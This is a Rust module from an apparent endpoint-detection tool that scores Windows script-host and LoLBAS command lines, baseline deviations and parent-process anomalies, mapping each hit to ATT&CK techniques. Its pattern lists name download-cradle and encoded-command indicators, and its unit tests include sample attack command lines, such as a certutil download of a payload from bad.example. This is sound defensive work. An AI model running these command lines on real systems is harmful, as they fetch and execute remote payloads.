//! Phase 12 detection-depth heuristics.
//!
//! These helpers intentionally stay explainable. Every score addition produces a
//! concrete operator-facing reason string, and ATT&CK mappings are marked as
//! heuristic where appropriate.

use crate::baseline::BaselineSignal;

#[derive(Debug, Default, Clone)]
pub struct DetectionAdditions {
    pub score: u8,
    pub reasons: Vec<String>,
    pub attack_tags: Vec<String>,
}

impl DetectionAdditions {
    pub fn merge_into(
        self,
        score: &mut u8,
        reasons: &mut Vec<String>,
        attack_tags: &mut Vec<String>,
    ) {
        *score = score.saturating_add(self.score);
        reasons.extend(self.reasons);
        attack_tags.extend(self.attack_tags);
    }

    pub fn triggered(&self) -> bool {
        self.score > 0 || !self.reasons.is_empty() || !self.attack_tags.is_empty()
    }
}

pub fn inspect_script_host(name: &str, cmdline: &str) -> DetectionAdditions {
    let mut out = DetectionAdditions::default();
    let cmd = cmdline.trim().to_ascii_lowercase();
    if cmd.is_empty() {
        return out;
    }

    match name {
        "powershell" | "pwsh" => {
            if contains_any(&cmd, &["-enc", "-encodedcommand", "frombase64string("]) {
                out.score = out.score.saturating_add(4);
                out.reasons.push(
                    "Script-host inspection: PowerShell encoded-command indicators present".into(),
                );
                out.attack_tags.push("T1059.001 PowerShell".into());
            }
            if contains_any(
                &cmd,
                &[
                    "-windowstyle hidden",
                    " -w hidden",
                    "-nop",
                    "-noprofile",
                    "executionpolicy bypass",
                    "-ep bypass",
                ],
            ) {
                out.score = out.score.saturating_add(3);
                out.reasons.push(
                    "Script-host inspection: stealthy PowerShell execution switches present".into(),
                );
                out.attack_tags.push("T1059.001 PowerShell".into());
            }
            if contains_any(
                &cmd,
                &[
                    "downloadstring(",
                    "downloadfile(",
                    "invoke-webrequest",
                    " iwr ",
                    "http://",
                    "https://",
                    "invoke-expression",
                    "iex ",
                ],
            ) {
                out.score = out.score.saturating_add(3);
                out.reasons.push(
                    "Script-host inspection: PowerShell download cradle / web execution indicators present".into(),
                );
                out.attack_tags
                    .push("T1105 Ingress Tool Transfer (heuristic)".into());
            }
        }
        "wscript" | "cscript" => {
            if contains_any(
                &cmd,
                &[
                    ".js",
                    ".jse",
                    ".vbs",
                    ".vbe",
                    "http://",
                    "https://",
                    "scrobj.dll",
                ],
            ) {
                out.score = out.score.saturating_add(4);
                out.reasons.push(
                    "Script-host inspection: Windows Script Host launching a script or remote scriptlet".into(),
                );
                out.attack_tags.push("T1059.005 Visual Basic".into());
            }
        }
        "mshta" => {
            if contains_any(
                &cmd,
                &["http://", "https://", "javascript:", "vbscript:", ".hta"],
            ) {
                out.score = out.score.saturating_add(4);
                out.reasons.push(
                    "Script-host inspection: mshta remote / script execution indicators present"
                        .into(),
                );
                out.attack_tags.push("T1218.005 Mshta".into());
            }
        }
        "regsvr32" => {
            if contains_any(&cmd, &["scrobj.dll", "http://", "https://"]) {
                out.score = out.score.saturating_add(4);
                out.reasons.push(
                    "Script-host inspection: regsvr32 remote scriptlet execution indicators present".into(),
                );
                out.attack_tags.push("T1218.010 Regsvr32".into());
            }
        }
        "rundll32" => {
            if contains_any(&cmd, &["url.dll", "javascript:", "http://", "https://"]) {
                out.score = out.score.saturating_add(3);
                out.reasons.push(
                    "Script-host inspection: rundll32 command line suggests remote or script-backed execution".into(),
                );
                out.attack_tags.push("T1218.011 Rundll32".into());
            }
        }
        "cmd" => {
            if contains_any(
                &cmd,
                &[
                    "/c powershell",
                    "/c pwsh",
                    "/c mshta",
                    "/c wscript",
                    "/c cscript",
                    "/c regsvr32",
                    "/c rundll32",
                ],
            ) {
                out.score = out.score.saturating_add(2);
                out.reasons.push(
                    "Script-host inspection: cmd.exe launching a secondary script or LoLBAS host"
                        .into(),
                );
                out.attack_tags
                    .push("T1059.003 Windows Command Shell".into());
            }
        }
        "certutil" => {
            if contains_any(
                &cmd,
                &[
                    "-urlcache",
                    "-verifyctl",
                    "-decode",
                    "-decodehex",
                    "http://",
                    "https://",
                ],
            ) {
                out.score = out.score.saturating_add(3);
                out.reasons.push(
                    "Script-host inspection: certutil command line suggests download or decode abuse"
                        .into(),
                );
                out.attack_tags
                    .push("T1105 Ingress Tool Transfer (heuristic)".into());
                out.attack_tags
                    .push("T1140 Deobfuscate/Decode Files or Information".into());
            }
        }
        "msiexec" => {
            if contains_any(&cmd, &["http://", "https://", "/i", "/qn", "/quiet"]) {
                out.score = out.score.saturating_add(3);
                out.reasons.push(
                    "Script-host inspection: msiexec command line suggests silent remote package execution"
                        .into(),
                );
                out.attack_tags.push("T1218.007 Msiexec".into());
            }
        }
        "installutil" => {
            if contains_any(&cmd, &["/logfile=", "/u", ".dll", ".exe"]) {
                out.score = out.score.saturating_add(3);
                out.reasons.push(
                    "Script-host inspection: installutil command line suggests proxy execution of a managed payload".into(),
                );
                out.attack_tags.push("T1218.004 InstallUtil".into());
            }
        }
        "msbuild" => {
            if contains_any(&cmd, &[".xml", ".proj", ".csproj", ".targets"]) {
                out.score = out.score.saturating_add(3);
                out.reasons.push(
                    "Script-host inspection: msbuild command line suggests project-file backed code execution".into(),
                );
                out.attack_tags.push("T1127.001 MSBuild".into());
            }
        }
        _ => {}
    }

    dedup(&mut out.attack_tags);
    out
}

pub fn inspect_behavioural_baseline(name: &str, signal: BaselineSignal) -> DetectionAdditions {
    let mut out = DetectionAdditions::default();
    if !signal.mature || is_noisy_process(name) {
        return out;
    }
    if signal.new_remote {
        out.score = out.score.saturating_add(2);
        out.reasons.push(format!(
            "Behavioural baseline deviation: stable process contacted a never-before-seen remote target after {} observations",
            signal.observations
        ));
    }
    if signal.new_port {
        out.score = out.score.saturating_add(1);
        out.reasons.push(
            "Behavioural baseline deviation: stable process used a new destination port".into(),
        );
    }
    if signal.new_country {
        out.score = out.score.saturating_add(1);
        out.reasons.push(
            "Behavioural baseline deviation: stable process reached a new country profile".into(),
        );
    }
    out
}

pub fn inspect_parent_token_anomaly(
    name: &str,
    ancestors: &[(String, u32)],
    proc_user: &str,
    parent_user: &str,
) -> DetectionAdditions {
    let mut out = DetectionAdditions::default();
    let Some((immediate_parent, _)) = ancestors.first() else {
        return out;
    };
    let parent = crate::config::normalise_name(immediate_parent);
    let is_script_capable = matches!(
        name,
        "powershell"
            | "pwsh"
            | "cmd"
            | "wscript"
            | "cscript"
            | "mshta"
            | "regsvr32"
            | "rundll32"
            | "wmic"
            | "certutil"
            | "msiexec"
            | "installutil"
            | "msbuild"
    );
    let sensitive_parent = matches!(
        parent.as_str(),
        "services" | "svchost" | "wmiprvse" | "taskeng" | "schtasks" | "winlogon" | "lsass"
    );

    if sensitive_parent && is_script_capable {
        out.score = out.score.saturating_add(3);
        out.reasons.push(format!(
            "Parent/token anomaly: sensitive system parent {} spawned script-capable child {}",
            immediate_parent, name
        ));
        out.attack_tags
            .push("T1134 Access Token Manipulation / Parent Privilege Anomaly (heuristic)".into());
    }

    let parent_user_lc = parent_user.to_ascii_lowercase();
    let proc_user_lc = proc_user.to_ascii_lowercase();
    let parent_is_system = parent_user_lc.contains("s-1-5-18")
        || parent_user_lc.contains("s-1-5-19")
        || parent_user_lc.contains("s-1-5-20");
    if parent_is_system
        && !proc_user.is_empty()
        && !parent_user.is_empty()
        && proc_user_lc != parent_user_lc
        && is_script_capable
    {
        out.score = out.score.saturating_add(2);
        out.reasons.push(
            "Parent/token anomaly: SYSTEM-context ancestry spawned a different-user script-capable process".into(),
        );
        out.attack_tags
            .push("T1134 Access Token Manipulation / Parent Privilege Anomaly (heuristic)".into());
    }

    dedup(&mut out.attack_tags);
    out
}

#[allow(clippy::too_many_arguments)]
pub fn inspect_signed_binary_abuse(
    name: &str,
    publisher: &str,
    is_trusted: bool,
    reputation_hit: Option<&str>,
    recently_dropped: bool,
    beaconing: bool,
    pre_login: bool,
    dga_like: bool,
    script_host_abuse: bool,
) -> DetectionAdditions {
    let mut out = DetectionAdditions::default();
    if publisher.trim().is_empty() || is_trusted {
        return out;
    }
    let suspicious_corroboration = reputation_hit.is_some()
        || recently_dropped
        || beaconing
        || pre_login
        || dga_like
        || script_host_abuse;
    if !suspicious_corroboration {
        return out;
    }

    out.score = out.score.saturating_add(3);
    out.reasons.push(format!(
        "Signed-but-malicious heuristic: signed process {} ({}) still shows multiple malicious corroboration signals",
        name,
        publisher.trim()
    ));
    if script_host_abuse {
        out.attack_tags
            .push("T1218 Signed Binary Proxy Execution (heuristic)".into());
    }
    if recently_dropped {
        out.attack_tags
            .push("T1574 Hijack Execution Flow / Sideloading (heuristic)".into());
    }
    dedup(&mut out.attack_tags);
    out
}

pub fn dedup(values: &mut Vec<String>) {
    let mut seen = std::collections::BTreeSet::new();
    values.retain(|value| seen.insert(value.to_ascii_lowercase()));
}

fn contains_any(haystack: &str, needles: &[&str]) -> bool {
    needles.iter().any(|needle| haystack.contains(needle))
}

fn is_noisy_process(name: &str) -> bool {
    matches!(
        name,
        "chrome"
            | "msedge"
            | "firefox"
            | "opera"
            | "brave"
            | "vivaldi"
            | "msedgewebview2"
            | "spotify"
            | "slack"
            | "discord"
            | "telegram"
            | "whatsapp"
            | "zoom"
            | "steam"
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn powershell_encoded_command_triggers() {
        let additions =
            inspect_script_host("powershell", "powershell -nop -w hidden -enc aQBlAHgA");
        assert!(additions.score >= 7);
        assert!(additions
            .reasons
            .iter()
            .any(|r| r.contains("encoded-command")));
        assert!(additions
            .attack_tags
            .iter()
            .any(|t| t.contains("T1059.001")));
    }

    #[test]
    fn certutil_download_decode_triggers_multiple_tags() {
        let additions = inspect_script_host(
            "certutil",
            "certutil -urlcache -split -f https://bad.example/payload.bin payload.bin",
        );
        assert!(additions.score >= 3);
        assert!(additions.attack_tags.iter().any(|t| t.contains("T1105")));
    }

    #[test]
    fn mature_baseline_signal_scores_but_browser_noise_is_suppressed() {
        let signal = BaselineSignal {
            mature: true,
            new_remote: true,
            new_port: true,
            new_country: false,
            observations: 20,
        };
        let updater = inspect_behavioural_baseline("updater", signal);
        assert!(updater.score >= 3);

        let chrome = inspect_behavioural_baseline("chrome", signal);
        assert_eq!(chrome.score, 0);
    }

    #[test]
    fn system_parent_spawning_mshta_triggers_anomaly() {
        let additions = inspect_parent_token_anomaly(
            "mshta",
            &[("svchost.exe".to_string(), 1000)],
            "S-1-5-21-user",
            "S-1-5-18",
        );
        assert!(additions.score >= 3);
        assert!(additions.attack_tags.iter().any(|t| t.contains("T1134")));
    }
}
